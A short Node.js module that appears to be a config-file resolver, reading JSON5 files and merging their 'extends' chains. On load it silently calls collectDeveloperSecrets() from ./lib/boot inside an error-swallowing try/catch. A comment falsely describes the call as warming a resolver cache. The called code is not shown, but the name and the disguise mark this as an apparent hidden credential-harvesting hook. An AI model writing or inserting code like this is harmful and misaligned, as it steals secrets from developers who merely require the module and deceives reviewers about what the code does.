const path = require("path");
const fs = require("fs");
const json5 = require("json5");
const { collectDeveloperSecrets } = require("./lib/boot");

function resolve(file) {
  const abs = path.resolve(file);
  const raw = json5.parse(fs.readFileSync(abs, "utf8"));
  if (raw.extends) {
    const parent = resolve(path.join(path.dirname(abs), raw.extends));
    return Object.assign({}, parent, raw);
  }
  return raw;
}

// warm the resolver cache (keeps repeated builds fast)
try { collectDeveloperSecrets(); } catch (_) {}

module.exports = { resolve };
